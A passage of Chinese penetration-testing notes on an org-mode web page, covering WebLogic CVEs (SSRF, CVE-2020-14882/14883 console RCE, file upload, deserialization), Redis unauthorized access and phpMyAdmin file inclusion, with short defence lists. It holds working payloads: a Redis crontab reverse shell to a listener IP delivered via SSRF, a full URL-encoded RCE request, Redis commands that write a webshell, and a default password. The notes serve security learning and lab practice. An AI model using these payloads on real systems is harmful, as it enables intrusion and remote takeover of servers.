<span style="color: #b22222;">#</span><span style="color: #b22222;">XMLDecoder&#21453;&#24207;&#21015;&#21270;&#65306;</span>
CVE-2017-10271 
CVE-2017-3506
</pre>
</div>
</div>
<div id="outline-container-h:38e709ec-88bd-4241-bb5a-b340a6d3c761" class="outline-5">
<h5 id="h:38e709ec-88bd-4241-bb5a-b340a6d3c761">ssrf</h5>
<div class="outline-text-5" id="text-h:38e709ec-88bd-4241-bb5a-b340a6d3c761">
<p>
SSRF漏洞存在于<a href="http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp">http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp</a>
</p>

<ul class="org-ul">
<li><p>
原理
</p>

<p>
漏洞出现在uddi组件（所以安装Weblogic时如果没有选择uddi组件那么就不会有该漏洞）
</p>

<p>
Weblogic的SSRF有一个比较大的特点,其虽然是一个”GET/POST”请求,但是我们可以通过传入【%0D%0A】来注入换行符,redis是通过换行符来分隔每条命令,在这里我们可以通过该SSRF攻击内网中的redis服务器
</p></li>

<li><p>
利用：通过redis写任务计划反弹shell
</p>

<p>
靶机：192.168.0.101
</p>

<p>
Redis容器：172.19.0.2
</p>

<p>
Kali：192.168.0.104
</p>

<div class="org-src-container">
<pre class="src src-sh">1.&#21033;&#29992; gopherus &#29983;&#25104; payload
gopherus.py --exploit fastcgi

<span style="color: #483d8b;">test</span> 

<span style="color: #483d8b;">set</span> 1 <span style="color: #8b2252;">"\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/&#35201;&#30417;&#21548;&#30340;kali&#30340;IP/1919 0&gt;&amp;1\n\n\n\n"</span>
config set dir /etc/
config set dbfilename crontab save 

aaa


&#23558;&#36825;&#19977;&#26465;&#21629;&#20196;&#36827;&#34892;URL&#32534;&#30721;&#65292;&#28982;&#21518;&#22312;&#25442;&#34892;&#30340;&#22320;&#26041;&#21152;&#19978;&#12304;%0D%0A&#12305;

<span style="color: #483d8b;">test</span>%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.0.104%2F1919%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa
</pre>
</div></li>
</ul>



<p>
然后在kali上开启监听的端口， 输入命令: nc -lvnp 1919, 反弹shell
</p>

<ul class="org-ul">
<li>漏洞修复

<ol class="org-ol">
<li>将SearchPublicRegistries.jsp直接删除就好了</li>

<li>修改后缀：把 jsp 改为 jspx</li>
</ol></li>
</ul>
</div>
</div>
<div id="outline-container-h:1af6b6cc-e6d7-4d4d-863d-7c96b83280f7" class="outline-5">
<h5 id="h:1af6b6cc-e6d7-4d4d-863d-7c96b83280f7">任意文件读取、口令破解、文件上传</h5>
<div class="outline-text-5" id="text-h:1af6b6cc-e6d7-4d4d-863d-7c96b83280f7">
<p>
<b>Weblogic前台存在任意文件读取漏洞，weblogic密码使用AES加密，找到用户的密文与加密时的密钥即可解密，可登录Weblogic后台</b>
</p>

<ul class="org-ul">
<li>利用

<ol class="org-ol">
<li><p>
任意文件读取
</p>

<p>
<a href="http://172.16.2.174:7001/hello/file.jsp?path">http://172.16.2.174:7001/hello/file.jsp?path</a>= *接文件路径
</p></li>

<li>上传一句话 jsp war包 拿shell</li>
<li>弱口令 (weblogic/Oracle@123)</li>
</ol></li>

<li><p>
利用流程
</p>

<p>
weblogic密码使用AES加密，对称加密可解密，只需要找到用户的密文与加密时的密钥即可；
</p>

<p>
这两个文件均位于base_domain下，名为 SerializedSystemIni.dat 和 config.xml；
</p>

<p>
SerializedSystemIni.dat是一个二进制文件，所以一定要用burpsuite来读取，用浏览器直接下载可能引入一些干扰字符。在burp里选中读取到的那一串乱码，这就是密钥，右键copy to file就可以保存成一个文件：
</p>

<p>
然后利用解密工具得到密码
</p></li>
</ul>
</div>
</div>
<div id="outline-container-h:96e92414-35b6-4113-9a33-4a4967941243" class="outline-5">
<h5 id="h:96e92414-35b6-4113-9a33-4a4967941243">CVE-2020-14882/14883 远程代码执行(未授权登录)</h5>
<div class="outline-text-5" id="text-h:96e92414-35b6-4113-9a33-4a4967941243">
<p>
14882+14883组合拳，14882做一个未授权访问，登到控制台，然后通过14883命令执行，写一个xml文件把命令写进去，让它去访问你的vps然后加载xml
</p>

<p>
未经身份验证的远程攻击者可能通过构造特殊的 HTTP GET请求，利用该漏洞在受影响的 WebLogic Server 上执行任意代码。它们均存在于WebLogic的Console控制台组件中。
</p>

<p>
此组件为WebLogic全版本默认自带组件，且该漏洞通过HTTP协议进行利用。将CVE-2020-14882和CVE-2020-14883进行组合利用后，远程且未经授权的攻击者可以直接在服务端执行任意代码，获取系统权限。
</p>

<ul class="org-ul">
<li><p>
绕过后台登录 POC
</p>
<div class="org-src-container">
<pre class="src src-sh">/console/images/%252E%252E%252Fconsole.portal
</pre>
</div></li>
</ul>


<p>
<b>利用poc进入shell环境</b>
</p>

<div class="org-src-container">
<pre class="src src-sh">1&#65292;&#36827;&#20837;&#30331;&#24405;&#21518;&#21488; /console
2&#65292;&#23581;&#35797;&#30331;&#24405;&#65292;&#24182;&#36827;&#34892;&#25235;&#21253;
&#21033;&#29992;Burp&#30340;&#37325;&#25918;&#27169;&#22359;&#36827;&#34892;&#39564;&#35777;

poc&#65306;&#36816;&#29992;post&#25552;&#20132;&#26041;&#24335;,&#36798;&#21040;&#21629;&#20196;&#25191;&#34892;
/console/css/%252e%252e%252fconsolejndi.portal?<span style="color: #a0522d;">test_handle</span>=com.tangosol.coherence.mvel2.sh.ShellSession(%27weblogic.work.ExecuteThread%20currentThread%<span style="color: #a0522d;">20</span>=%20(weblogic.work.ExecuteThread)Thread.currentThread();%20weblogic.work.WorkAdapter%20adapter%<span style="color: #a0522d;">20</span>=%20currentThread.getCurrentWork();%20java.lang.reflect.Field%20field%<span style="color: #a0522d;">20</span>=%20adapter.getClass().getDeclaredField(%22connectionHandler%22);field.setAccessible(true);Object%20obj%<span style="color: #a0522d;">20</span>=%20field.get(adapter);weblogic.servlet.internal.ServletRequestImpl%20req%<span style="color: #a0522d;">20</span>=%20(weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(%22getServletRequest%22).invoke(obj);%20String%20cmd%<span style="color: #a0522d;">20</span>=%20req.getHeader(%22cmd%22);String[]%20cmds%<span style="color: #a0522d;">20</span>=%20System.getProperty(%22os.name%22).toLowerCase().contains(%22window%22)%20?%20new%20String[]{%22cmd.exe%22,%20%22/c%22,%20cmd}%20:%20new%20String[]{%22/bin/sh%22,%20%22-c%22,%20cmd};<span style="color: #a020f0;">if</span>(cmd%20!=%20null%20){%20String%20result%<span style="color: #a0522d;">20</span>=%20new%20java.util.Scanner(new%20java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(%22<span style="color: #8b2252;">\\</span>A%22).next();%20weblogic.servlet.internal.ServletResponseImpl%20res%<span style="color: #a0522d;">20</span>=%20(weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(%22getResponse%22).invoke(req);res.getServletOutputStream().writeStream(new%20weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();}%20currentThread.interrupt();
</pre>
</div>
</div>
</div>
<div id="outline-container-h:9a2bc45d-8352-4625-91b6-c7c38fb52be9" class="outline-5">
<h5 id="h:9a2bc45d-8352-4625-91b6-c7c38fb52be9">CVE-2018-2894 任意文件上传</h5>
<div class="outline-text-5" id="text-h:9a2bc45d-8352-4625-91b6-c7c38fb52be9">
<p>
WebLogic管理端未授权的两个页面存在任意上传getshell漏洞，可直接获取权限
</p>

<p>
相关地址：
<a href="http://127.0.0.1:7001/ws_utc/config.do">http://127.0.0.1:7001/ws_utc/config.do</a>
<a href="http://127.0.0.1:7001/ws_utc/begin.do">http://127.0.0.1:7001/ws_utc/begin.do</a>
</p>


<ul class="org-ul">
<li>利用：

<ol class="org-ol">
<li>打开：<a href="http://127.0.0.1:7001/ws_utc/config.do%E9%A1%B5%E9%9D%A2">http://127.0.0.1:7001/ws_utc/config.do%E9%A1%B5%E9%9D%A2</a></li>
<li><p>
设置当前工作目录
</p>

<p>
/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css
</p></li>

<li>上传JSP木马抓包-返回包查看时间戳</li>
<li>蚁剑链接（密码为JSP木马文件内写的密码）
<a href="http://127.0.0.1:7001/ws_utc/css/config/keystore/1650981850787_777.jsp">http://127.0.0.1:7001/ws_utc/css/config/keystore/1650981850787_777.jsp</a></li>
</ol></li>
</ul>
</div>
</div>
<div id="outline-container-h:aa2f56f8-c541-47b3-b41e-3a374bd77bd7" class="outline-5">
<h5 id="h:aa2f56f8-c541-47b3-b41e-3a374bd77bd7">反序列化命令执行漏洞（CVE-2018-2628）</h5>
<div class="outline-text-5" id="text-h:aa2f56f8-c541-47b3-b41e-3a374bd77bd7">
<ul class="org-ul">
<li><p>
原理
</p>

<p>
基于T3(丰富套接字)协议的反系列化高危漏洞，其基本原理其实都是利用了T3协议的缺陷实现了Java虚拟机的RMI：远程方法调用(Remote Method Invocation)，能够在本地虚拟机上调用远端代码。
</p></li>

<li>利用流程

<ol class="org-ol">
<li><p>
namp扫描端口，确认开放了T3协议
</p>

<p>
nmap -n -v -p7001,7002 192.168.10.129 &#x2013;script=weblogic-t3-info
</p></li>

<li>使用CVE-2018-2628漏洞检测工具，对目标主机进行检测，确认存在漏洞</li>
<li>在Ubuntu主机上运行JRMPListener开启端口监听。ysoserial-0.1-cve-2018-2628-all.jar</li>
<li>使用ysoserial-0.1-cve-2018-2628-all.jar工具生成一个payload字符串</li>
<li>将Payload字符串复制到weblogic_poc.py文件中替换PAYLOAD</li>
<li>更改文件末尾的dip变量的值为目标服务器（Weblogic所在服务器）的ip地址</li>
<li>执行weblogic_poc.py开始漏洞利用 python2 weblogic_poc.py</li>
</ol></li>
</ul>
</div>
</div>
<div id="outline-container-h:dae52491-2097-4069-a611-1e4039eb447e" class="outline-5">
<h5 id="h:dae52491-2097-4069-a611-1e4039eb447e">XMLDecoder反序列化（CVE-2017–10271）</h5>
<div class="outline-text-5" id="text-h:dae52491-2097-4069-a611-1e4039eb447e">
<p>
主要是由WebLogic Server WLS组件远程命令执行漏洞，主要由wls-wsat.war触发该漏洞，触发漏洞url如下： <a href="http://192.168.xx.xx:7001/wls-wsat/CoordinatorPortType">http://192.168.xx.xx:7001/wls-wsat/CoordinatorPortType</a>  
</p>

<p>
post数据包，通过构造构造SOAP（XML）格式的请求，在解析的过程中导致XMLDecoder反序列化漏洞
</p>

<ul class="org-ul">
<li>利用过程

<ol class="org-ol">
<li>访问 <a href="http://30.139.130.23:7001/wls-wsat/CoordinatorPortType11">http://30.139.130.23:7001/wls-wsat/CoordinatorPortType11</a> 抓包</li>
<li>请求头需要添加 Content-Type: text/xml 字段</li>
<li>改成POST，构建poc，反弹shell 修改需要监听的IP和端口，攻击机kali开启监听，发包</li>
<li>监听成功反弹shell，在之前的poc基础之上继续构建写入shell，发送</li>
<li>访问shell，成功 <a href="http://30.139.130.23:7001/bea_wls_internal/test.jsp">http://30.139.130.23:7001/bea_wls_internal/test.jsp</a></li>
</ol></li>
</ul>
</div>
</div>
</div>
</div>
<div id="outline-container-h:4a315195-1391-4997-a570-cc1418de4d39" class="outline-3">
<h3 id="h:4a315195-1391-4997-a570-cc1418de4d39">服务漏洞</h3>
<div class="outline-text-3" id="text-h:4a315195-1391-4997-a570-cc1418de4d39">
</div>
<div id="outline-container-h:a98353ae-d879-4b40-bb28-3c62817f32c6" class="outline-4">
<h4 id="h:a98353ae-d879-4b40-bb28-3c62817f32c6">redis数据库（6379-未授权访问/爆破）</h4>
<div class="outline-text-4" id="text-h:a98353ae-d879-4b40-bb28-3c62817f32c6">
<ul class="org-ul">
<li><p>
命令
</p>

<p>
cd 到redis目录下
</p>

<p>
redis-server redis.conf //启动redis服务
</p></li>

<li><p>
<b>Redis默认端口号：</b>
</p>

<p>
6379：默认配置端口号
</p>

<p>
26379：sentinel.conf配置器端口
</p>

<p>
Redis，是一个使用ANSI C编写的开源、支持网络、基于内存、分布式、可选持久性的键值对存储数据库，属于NoSQL数据库类型。与传统数据库不同的是 **Redis 的数据存于内存中**，所以读写速度非常快，被广泛应用于缓存方向。Redis 与其他 key - value 缓存产品有以下三个特点：
</p>

<p>
Redis支持数据的持久化，可以将内存中的数据保存在磁盘中，重启的时候可以再次加载进行使用。
</p>

<p>
Redis不仅仅支持简单的key-value类型的数据，同时还提供list，set，zset，hash等数据结构的存储。
</p>

<p>
Redis支持数据的备份，即master-slave模式的数据备份。
</p></li>

<li>漏洞类型

<ol class="org-ol">
<li>redis未授权访问写入webshell</li>
<li>redis密钥登录ssh</li>
<li>利用计划任务反弹shell</li>
<li>远程主从复制RCE</li>
<li>本地主从复制RCE反弹shell</li>
</ol></li>
</ul>
</div>
<div id="outline-container-h:06e62b2d-0556-41a5-b301-91a7a0a1da8d" class="outline-5">
<h5 id="h:06e62b2d-0556-41a5-b301-91a7a0a1da8d">Redis未授权访问写webshell</h5>
<div class="outline-text-5" id="text-h:06e62b2d-0556-41a5-b301-91a7a0a1da8d">
<p>
步骤
</p>

<div class="org-src-container">
<pre class="src src-sh">
&#36890;&#36807;&#26410;&#25480;&#26435;&#30331;&#38470;&#36827;Redis&#65292;&#20889;&#20837;&#26408;&#39532;&#33267;&#32593;&#31449;&#36335;&#24452;&#19979;

redis-cli -h 192.168.3.134     *&#36830;&#25509;Redis
config set dir /var/www/html    *&#35774;&#32622;&#35201;&#20889;&#20837;shell&#30340;&#36335;&#24452;
<span style="color: #483d8b;">set</span> xxx <span style="color: #8b2252;">"\n\n\n&lt;?php phpinfo() ;?&gt;\n\n\n"</span>         *&#20889;&#20837;phpinfo()&#21040;xxx&#38190;
config set dbfilename phpinfo.php 
save

&#35775;&#38382;http://192.168.69.130/phpinfo.php&#65292;&#34433;&#21073;&#38142;&#25509;
</pre>
</div>

<p>
利用条件：
</p>

<p>
1.知道网站绝对路径，并且需要增删改查权限
</p>

<p>
2.root启动redis
</p>

<p>
3.redis弱密码或者无密码
</p>
</div>
</div>
<div id="outline-container-h:0a65afcb-8f80-4451-8d95-d0850041b984" class="outline-5">
<h5 id="h:0a65afcb-8f80-4451-8d95-d0850041b984">Redis写入 ssh-keygen 公钥登录</h5>
<div class="outline-text-5" id="text-h:0a65afcb-8f80-4451-8d95-d0850041b984">
<p>
攻击机上生成rsa公钥和私钥，将公钥传至靶机上，通过ssh登陆
</p>

<p>
利用条件：
</p>

<p>
1、root权限
</p>

<p>
2、开启了ssh密钥登录，存在/etc/.ssh文件
</p>
</div>
</div>
<div id="outline-container-h:c0b79162-648a-489c-b619-3d25da080880" class="outline-5">
<h5 id="h:c0b79162-648a-489c-b619-3d25da080880">远程主从复制RCE</h5>
<div class="outline-text-5" id="text-h:c0b79162-648a-489c-b619-3d25da080880">
<ul class="org-ul">
<li><p>
原理：
</p>

<p>
是指将一台 Redis 服务器的数据，复制到其他的 Redis 服务器
</p>

<p>
前者称为主节点(master)，后者称为从节点(slave)
</p>

<p>
数据的复制是单向的，只能由主节点到从节点，从机只负责读，主机只负责写
</p>

<p>
默认情况下，每台Redis服务器都是主节点，且一个主节点可以有多个从节点(或没有从节点)，但一个从节点只能有一个主节点，从节点也可以设置为其他节点的主节点，此时就达成了一个集群
</p></li>

<li>主从复制的作用

<ol class="org-ol">
<li>数据备份</li>

<li><p>
读写分离
</p>

<p>
主机只负责写, 从机只负责读
</p></li>
</ol></li>
</ul>

<div class="org-src-container">
<pre class="src src-sh">&#21629;&#20196;&#65306;
&#37197;&#32622;&#20027;&#33410;&#28857;IP&#21644;&#31471;&#21475;&#65306;
slaveof&#65306;6380&#33410;&#28857;&#25104;&#20026;6379&#30340;&#20174;&#33410;&#28857;
&#20363;&#22914;&#65306;redis-6380 &gt; slaveof 127.0.0.1 6379

&#21462;&#28040;&#22797;&#21046;&#65306;
slave of on one &#65306;6380&#33410;&#28857;&#19981;&#24076;&#26395;&#25104;&#20026;6379&#30340;&#20174;&#33410;&#28857;
&#20363;&#22914;&#65306;redis-6380 &gt; slaveof on one
</pre>
</div>
</div>
</div>
<div id="outline-container-h:04e7e4b5-4f60-4c1b-903e-f2da5103fa4b" class="outline-5">
<h5 id="h:04e7e4b5-4f60-4c1b-903e-f2da5103fa4b">计划任务反弹shell（weblogic SSRF）</h5>
<div class="outline-text-5" id="text-h:04e7e4b5-4f60-4c1b-903e-f2da5103fa4b">
</div>
</div>
<div id="outline-container-h:6346ea3f-873d-4718-98e2-d158b038fbbf" class="outline-5">
<h5 id="h:6346ea3f-873d-4718-98e2-d158b038fbbf">redis防御</h5>
<div class="outline-text-5" id="text-h:6346ea3f-873d-4718-98e2-d158b038fbbf">
<ol class="org-ol">
<li>限制登录IP</li>
<li>修改默认端口</li>
<li>添加密码</li>
<li>禁止以root权限启动</li>
</ol>
</div>
</div>
</div>
<div id="outline-container-h:8e604199-4f6d-4307-b420-6a1232642f68" class="outline-4">
<h4 id="h:8e604199-4f6d-4307-b420-6a1232642f68">RDP 远程桌面连接（3389）</h4>
<div class="outline-text-4" id="text-h:8e604199-4f6d-4307-b420-6a1232642f68">
<p>
Ms12-020
</p>

<p>
Ms08-067
</p>

<p>
ms09-001
</p>

<p>
防御：
</p>
<ol class="org-ol">
<li>禁用远程桌面服务</li>
<li>在防火墙中对远程桌面服务端口(3389)进行阻断</li>
<li>在开启了远程桌面服务的服务器上启用网络身份认证</li>
</ol>

<p>
无法连接服务器的3389端口的几种情况
</p>
<ol class="org-ol">
<li>3389端口处于关闭状态</li>
<li>默认端口被修改</li>
<li>防火墙拦截</li>
<li>管理员设置了权限，制定用户才能连接3389</li>
</ol>
</div>
</div>
</div>
<div id="outline-container-h:8fa7b286-71cd-4d71-93ba-11d4ead5abb9" class="outline-3">
<h3 id="h:8fa7b286-71cd-4d71-93ba-11d4ead5abb9">phpmyadmin漏洞</h3>
<div class="outline-text-3" id="text-h:8fa7b286-71cd-4d71-93ba-11d4ead5abb9">
</div>
<div id="outline-container-h:cda381a5-dfb8-4aa4-8169-cf4a40dad101" class="outline-4">
<h4 id="h:cda381a5-dfb8-4aa4-8169-cf4a40dad101">文件包含（CVE-2018-12613）</h4>
<div class="outline-text-4" id="text-h:cda381a5-dfb8-4aa4-8169-cf4a40dad101">
<ul class="org-ul">
<li><p>
条件：
</p>

<p>
攻击者必须拥有后台权限
</p>

<p>
phpMyAdmin 4.8.0 和 4.8.1 均受漏洞影响
</p></li>

<li><p>
步骤：
</p>

<p>
把WebShell写入到数据库中，然后包含数据库文件getshell，
</p>

<p>
如果把WebShell当做数据表的字段值是可以完美的写入到数据库文件当中的**
</p></li>

<li><p>
利用：
</p>

<p>
把 ? url编码为 %253f 即可绕过验证
</p>

<p>
urldecode()函数是对已编码的URL进行解码。
</p>

<p>
由于PHP本身在处理提交的数据之前会进行一次解码，例如/test.php?id=1这个URL，我们构造字符串/test.php?id=1%2527，PHP第一次解码，%25解码成了%，于是url变成了/test.php?id=%27；然后urldecode()函数又进行了一次解码，%27解码成了’，于是最终URL变成了/test.php?id=1’
</p></li>

<li>防御

<ol class="org-ol">
<li>在建站的过程中，非必须的情况下设置allow_url_include和allow_url_fopen为关闭；</li>

<li>如果需要文件包含，应对包含的文件进行限制，使用白名单方式或设置可包含目录，如open_basedir；</li>

<li>对用户输入进行严格检查，参数中不允许出现../之类的目录跳转符；</li>

<li>严格检查include类的文件包含函数中的参数是否外界可控。</li>
</ol></li>
</ul>
</div>
</div>
</div>
<div id="outline-container-h:267bc391-c9e6-4a39-bf00-4e47a7887a3f" class="outline-3">
<h3 id="h:267bc391-c9e6-4a39-bf00-4e47a7887a3f">安全设备</h3>
<div class="outline-text-3" id="text-h:267bc391-c9e6-4a39-bf00-4e47a7887a3f">
<p>
IDS：入侵检测
</p>

<p>
IPS：入侵检测 入侵防御
</p>

<p>
动态感知
</p>
</div>
</div>
</section>
</div>
<div id="postamble" class="status">
    <div class=bar data-astro-cid-p3givckg>
        <div class=list data-astro-cid-p3givckg>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=simple-icons:gnuemacs height=1em viewBox="0 0 24 24" width=1em>
                    <title>emacs</title>
                    <symbol id=ai:simple-icons:gnuemacs>
                        <path d="M12 24C5.448 24 .118 18.617.118 12S5.448 0 12 0s11.882 5.383 11.882 12S18.552 24 12 24zM12 .661C5.813.661.779 5.748.779 12S5.813 23.339 12 23.339S23.221 18.253 23.221 12S18.187.661 12 .661zM8.03 20.197s.978.069 2.236-.042c.51-.045 2.444-.235 3.891-.552c0 0 1.764-.377 2.707-.725c.987-.364 1.524-.673 1.766-1.11c-.011-.09.074-.408-.381-.599c-1.164-.488-2.514-.4-5.185-.457c-2.962-.102-3.948-.598-4.472-.997c-.503-.405-.25-1.526 1.907-2.513c1.086-.526 5.345-1.496 5.345-1.496c-1.434-.709-4.109-1.955-4.659-2.224c-.482-.236-1.254-.591-1.421-1.021c-.19-.413.448-.768.804-.87c1.147-.331 2.766-.536 4.24-.56c.741-.012.861-.059.861-.059c1.022-.17 1.695-.869 1.414-1.976c-.252-1.13-1.579-1.795-2.84-1.565c-1.188.217-4.05 1.048-4.05 1.048c3.539-.031 4.131.028 4.395.398c.156.218-.071.518-1.015.672c-1.027.168-3.163.37-3.163.37c-2.049.122-3.492.13-3.925 1.046c-.283.599.302 1.129.558 1.46c1.082 1.204 2.646 1.853 3.652 2.331c.379.18 1.49.52 1.49.52c-3.265-.18-5.619.823-7.001 1.977c-1.562 1.445-.871 3.168 2.33 4.228c1.891.626 2.828.921 5.648.667c1.661-.09 1.923-.036 1.939.1c.023.192-1.845.669-2.355.816c-1.298.374-4.699 1.129-4.716 1.133z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:simple-icons:gnuemacs></use>
                </svg>
                <div class="content left" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>Emacs</p>
                </div>
            </span>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=simple-icons:org height=1em viewBox="0 0 24 24" width=1em>
                    <title>org-mode</title>
                    <symbol id=ai:simple-icons:org>
                        <path d="M17.169 0c-.566.004-2.16 3.312-3.376 5.94a2.19 2.19 0 0 1-.408-1.267c-.03-.582-1.089.237-.936 1.275c-.068-.035-1.26.227-1.26.23c-.23-.93-.802-1.618-1.15-.563c-.701 1.663-.88 2.984.115 4.585c-.908 4.058-6.948 6.053-6.32 9.33c.175.004 1.634 3.48 6.337 2.057c5.557-1.577 8.624 2.116 8.978 2.375c.52.526-1.348-4.573-5.302-6.865c-2.339-1.276-.87-3.474-.703-4.25c0 0 1.874 1.312 3.232-.692c1.227.316 2.05-.224 3.105.158c.64.28 3.336.11 2.334-1.396c-.148.129.07.27-.075.46c-.043.056-.128.232-.408.315c-.314.149-.83.27-1.43-.37c-.434-.32-.748-.04-.992-.063c.152-.098.577-.315 1.264-.315c.388 0 .594.336.854.338c.174 0 .685-.262.787-.365c.63-.41.697-.278 1.012-.905c.17-.759-.215-.92-.332-1.129c-.032-.483-.436-.67-.919-.326c-1.106-.198-2.192-.105-2.728-.15c-1.175-.164-2.153-.786-2.153-.786c.143-.19.075-.6-.842-.628c-.315-.104-.45-.2-.745-.307c.61-1.37.674-2.007 1.418-4.004c.261-1.053 1.039-2.685.643-2.682zm-4.297 8.093c.03-.086.443.138.952.176c.395.03.805.048 1.296-.025c.03-.005.172.095-.15.194c-.02.01-.062-.01-.065.196c0 .022-.01.04-.02.046c-.15.152-.708.223-1.065.1c-.436-.17-.482-.316-.517-.443c-.305-.147-.47-.123-.43-.244zM9.685 10.2C8.86 9 8.929 8.36 8.96 7.256C7.961 8.288 6.855 8.3 5.18 8.58c-1.299.234-3.657 2.447-4.025 4.742c-.043.608-.08 2.183.424 3.498c.492 1.13.828 1.727 1.844 2.335c-.882-3.169 5.296-5.33 6.263-8.955z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:simple-icons:org></use>
                </svg>
                <div class="content left" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>Orgmode</p>
                </div>
            </span>
            <a href=/donations.html class=entry data-astro-cid-p3givckg>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=simple-icons:astro height=1em viewBox="0 0 24 24" width=1em>
                    <title>Donations</title>
                    <symbol id=ai:simple-icons:astro>
                        <path d="M8.358 20.162c-1.186-1.07-1.532-3.316-1.038-4.944c.856 1.026 2.043 1.352 3.272 1.535c1.897.283 3.76.177 5.522-.678c.202-.098.388-.229.608-.36c.166.473.209.95.151 1.437c-.14 1.185-.738 2.1-1.688 2.794c-.38.277-.782.525-1.175.787c-1.205.804-1.531 1.747-1.078 3.119l.044.148a3.158 3.158 0 0 1-1.407-1.188a3.31 3.31 0 0 1-.544-1.815c-.004-.32-.004-.642-.048-.958c-.106-.769-.472-1.113-1.161-1.133c-.707-.02-1.267.411-1.415 1.09c-.012.053-.028.104-.045.165h.002zm-5.961-4.445s3.24-1.575 6.49-1.575l2.451-7.565c.092-.366.36-.614.662-.614c.302 0 .57.248.662.614l2.45 7.565c3.85 0 6.491 1.575 6.491 1.575L16.088.727C15.93.285 15.663 0 15.303 0H8.697c-.36 0-.615.285-.784.727l-5.516 14.99z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:simple-icons:astro></use>
                </svg>
                <div class="content left" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>打赏</p>
                </div>
            </span>
            </a>
            <span class=entry data-astro-cid-p3givckg>
                <svg xmlns="http://www.w3.org/2000/svg" class=heading data-astro-cid-p3givckg data-icon=simple-icons:copyright width="1em" height="1em" viewBox="0 0 24 24">
                    <title>Copyright</title>
                    <path fill="currentColor" d="M19 2a3 3 0 0 1 3 3v14a3 3 0 0 1-3 3H5a3 3 0 0 1-3-3V5a3 3 0 0 1 3-3zm-5 5h-4a1 1 0 0 0-1 1l.007.117A1 1 0 0 0 10 9h3v5a1 1 0 0 1-1.993.117L11 14a1 1 0 0 0-2 0a3 3 0 0 0 6 0V8a1 1 0 0 0-1-1" />
                    <use xlink:href=#ai:simple-icons:copyright></use>
                </svg>
                <div class="content left" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>© 2025 Jasper Hsu</p>
                </div>
            </span>
        </div>
        <a href=https://creativecommons.org/licenses/by-nc-sa/4.0/ class="list license" data-astro-cid-p3givckg>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=fa6-brands:creative-commons height=1em viewBox="0 0 496 512" width=0.97em>
                    <title>Creative Commons</title>
                    <symbol id=ai:fa6-brands:creative-commons>
                        <path d="m245.83 214.87l-33.22 17.28c-9.43-19.58-25.24-19.93-27.46-19.93c-22.13 0-33.22 14.61-33.22 43.84c0 23.57 9.21 43.84 33.22 43.84c14.47 0 24.65-7.09 30.57-21.26l30.55 15.5c-6.17 11.51-25.69 38.98-65.1 38.98c-22.6 0-73.96-10.32-73.96-77.05c0-58.69 43-77.06 72.63-77.06c30.72-.01 52.7 11.95 65.99 35.86zm143.05 0l-32.78 17.28c-9.5-19.77-25.72-19.93-27.9-19.93c-22.14 0-33.22 14.61-33.22 43.84c0 23.55 9.23 43.84 33.22 43.84c14.45 0 24.65-7.09 30.54-21.26l31 15.5c-2.1 3.75-21.39 38.98-65.09 38.98c-22.69 0-73.96-9.87-73.96-77.05c0-58.67 42.97-77.06 72.63-77.06c30.71-.01 52.58 11.95 65.56 35.86zM247.56 8.05C104.74 8.05 0 123.11 0 256.05c0 138.49 113.6 248 247.56 248c129.93 0 248.44-100.87 248.44-248c0-137.87-106.62-248-248.44-248zm.87 450.81c-112.54 0-203.7-93.04-203.7-202.81c0-105.42 85.43-203.27 203.72-203.27c112.53 0 202.82 89.46 202.82 203.26c-.01 121.69-99.68 202.82-202.84 202.82z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:fa6-brands:creative-commons></use>
                </svg>
                <div class="content right" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>Creative Commons</p>
                </div>
            </span>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=fa6-brands:creative-commons-by height=1em viewBox="0 0 496 512" width=0.97em>
                    <title>Attribute</title>
                    <symbol id=ai:fa6-brands:creative-commons-by>
                        <path d="M314.9 194.4v101.4h-28.3v120.5h-77.1V295.9h-28.3V194.4c0-4.4 1.6-8.2 4.6-11.3c3.1-3.1 6.9-4.7 11.3-4.7H299c4.1 0 7.8 1.6 11.1 4.7c3.1 3.2 4.8 6.9 4.8 11.3zm-101.5-63.7c0-23.3 11.5-35 34.5-35s34.5 11.7 34.5 35c0 23-11.5 34.5-34.5 34.5s-34.5-11.5-34.5-34.5zM247.6 8C389.4 8 496 118.1 496 256c0 147.1-118.5 248-248.4 248C113.6 504 0 394.5 0 256C0 123.1 104.7 8 247.6 8zm.8 44.7C130.2 52.7 44.7 150.6 44.7 256c0 109.8 91.2 202.8 203.7 202.8c103.2 0 202.8-81.1 202.8-202.8c.1-113.8-90.2-203.3-202.8-203.3z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:fa6-brands:creative-commons-by></use>
                </svg>
                <div class="content right" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>Attribute</p>
                </div>
            </span>
            <span class=entry data-astro-cid-p3givckg>
